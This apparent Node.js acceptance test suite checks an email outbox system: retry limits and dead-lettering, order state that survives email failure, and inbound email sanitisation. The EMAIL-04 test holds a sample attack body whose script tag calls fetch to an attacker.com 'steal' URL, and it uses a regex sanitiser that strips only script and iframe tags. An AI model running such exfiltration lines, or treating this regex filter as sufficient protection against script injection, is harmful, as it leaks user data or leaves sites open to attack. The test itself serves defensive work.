/**
 * BeadsILY Acceptance Test Suite: Transactional Email & Outbox Queues
 * Requirements: EMAIL-01 through EMAIL-04
 */

import { test, describe, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { DatabaseSync } from 'node:sqlite';

function createEmailDb() {
  const db = new DatabaseSync(':memory:');
  db.exec(`
    CREATE TABLE email_outbox (
      id TEXT PRIMARY KEY,
      recipient TEXT NOT NULL,
      template_id TEXT NOT NULL,
      status TEXT NOT NULL CHECK (status IN ('queued', 'sent', 'bounced', 'failed', 'dead_letter')),
      attempts INTEGER NOT NULL DEFAULT 0,
      max_attempts INTEGER NOT NULL DEFAULT 5,
      last_error TEXT,
      created_at INTEGER NOT NULL,
      updated_at INTEGER NOT NULL
    );

    CREATE TABLE orders (
      id TEXT PRIMARY KEY,
      payment_status TEXT NOT NULL,
      email_status TEXT NOT NULL DEFAULT 'pending',
      created_at INTEGER NOT NULL
    );
  `);
  return db;
}

describe('EMAIL-01: Missing Production Configuration Visibility', () => {
  test('Throws visible operational error when binding/credentials absent; never returns false success', async () => {
    async function sendTransactionalEmail(env, message) {
      if (!env.SEND_EMAIL_BINDING) {
        throw new Error('CONFIG_ERROR: Cloudflare Email Sending binding (SEND_EMAIL_BINDING) is missing');
      }
      return { success: true };
    }

    const unconfiguredEnv = {};
    await assert.rejects(
      async () => await sendTransactionalEmail(unconfiguredEnv, { to: 'test@example.com' }),
      /CONFIG_ERROR: Cloudflare Email Sending binding/
    );
  });
});

describe('EMAIL-02: Queue Retry, Bounded Attempts & Dead Letter Escalation', () => {
  let db;
  const now = Date.now();

  beforeEach(() => {
    db = createEmailDb();
    db.exec(`INSERT INTO email_outbox VALUES ('msg-01', 'sarah@example.com', 'order_confirmation', 'queued', 0, 5, NULL, ${now}, ${now})`);
  });

  test('Failing email delivery increments retry attempts and escalates to dead_letter at max_attempts', () => {
    function processQueueMessage(messageId, mockDownstreamSuccess) {
      const msg = db.prepare("SELECT * FROM email_outbox WHERE id = ?").get(messageId);
      const newAttempts = msg.attempts + 1;

      if (!mockDownstreamSuccess) {
        if (newAttempts >= msg.max_attempts) {
          db.prepare("UPDATE email_outbox SET status = 'dead_letter', attempts = ?, last_error = 'Gateway Timeout 504' WHERE id = ?").run(newAttempts, messageId);
          return { status: 'dead_letter' };
        } else {
          db.prepare("UPDATE email_outbox SET status = 'queued', attempts = ?, last_error = 'Transient 503' WHERE id = ?").run(newAttempts, messageId);
          return { status: 'retry_queued', attempt: newAttempts };
        }
      } else {
        db.prepare("UPDATE email_outbox SET status = 'sent', attempts = ? WHERE id = ?").run(newAttempts, messageId);
        return { status: 'sent' };
      }
    }

    // Fail 4 times (retries)
    for (let i = 1; i <= 4; i++) {
      const res = processQueueMessage('msg-01', false);
      assert.equal(res.status, 'retry_queued');
      assert.equal(res.attempt, i);
    }

    // 5th failure: routes to dead_letter queue
    const resFinal = processQueueMessage('msg-01', false);
    assert.equal(resFinal.status, 'dead_letter');

    const finalRecord = db.prepare("SELECT * FROM email_outbox WHERE id = 'msg-01'").get();
    assert.equal(finalRecord.status, 'dead_letter');
    assert.equal(finalRecord.attempts, 5);
  });
});

describe('EMAIL-03: Decoupled Order State & Email Resilience', () => {
  test('Order remains paid even if confirmation email fails completely', () => {
    const db = createEmailDb();
    const now = Date.now();
    db.exec(`INSERT INTO orders VALUES ('ord-99', 'paid', 'pending', ${now})`);

    // Simulate email dispatch failure
    const emailFailed = true;
    if (emailFailed) {
      db.prepare("UPDATE orders SET email_status = 'failed_retry_scheduled' WHERE id = 'ord-99'").run();
    }

    const order = db.prepare("SELECT * FROM orders WHERE id = 'ord-99'").get();
    assert.equal(order.payment_status, 'paid', 'Payment status must remain paid');
    assert.equal(order.email_status, 'failed_retry_scheduled', 'Email failure flagged for retry without reverting payment');
  });
});

describe('EMAIL-04: Inbound Support Email Security & Sanitization', () => {
  function sanitizeInboundEmail(rawEmail) {
    // 1. Check attachment size & executable extension
    if (rawEmail.attachments) {
      for (const att of rawEmail.attachments) {
        if (att.sizeBytes > 10 * 1024 * 1024) throw new Error('ATTACHMENT_TOO_LARGE: Max 10MB allowed');
        const ext = att.filename.split('.').pop().toLowerCase();
        if (['exe', 'bat', 'cmd', 'ps1', 'vbs', 'scr', 'js'].includes(ext)) {
          att.quarantined = true;
          att.reason = 'EXECUTABLE_BLOCKED';
        }
      }
    }

    // 2. Sanitize HTML/Script tags from body
    let cleanBody = rawEmail.body
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '[SCRIPTS_REMOVED]')
      .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '[IFRAMES_REMOVED]');

    return {
      sender: rawEmail.sender,
      subject: rawEmail.subject,
      body: cleanBody,
      attachments: rawEmail.attachments,
    };
  }

  test('Quarantines dangerous attachments and strips script tags from inbound email body', () => {
    const maliciousEmail = {
      sender: 'attacker@evil.com',
      subject: 'Urgent: Invoice',
      body: 'Hello <script>fetch("https://attacker.com/steal")</script> please find attached.',
      attachments: [
        { filename: 'malware.exe', sizeBytes: 2048 },
        { filename: 'receipt.pdf', sizeBytes: 50000 },
      ],
    };

    const sanitized = sanitizeInboundEmail(maliciousEmail);
    assert.equal(sanitized.body.includes('<script>'), false);
    assert.equal(sanitized.body.includes('[SCRIPTS_REMOVED]'), true);
    assert.equal(sanitized.attachments[0].quarantined, true);
    assert.equal(sanitized.attachments[0].reason, 'EXECUTABLE_BLOCKED');
    assert.equal(sanitized.attachments[1].quarantined, undefined);
  });
});
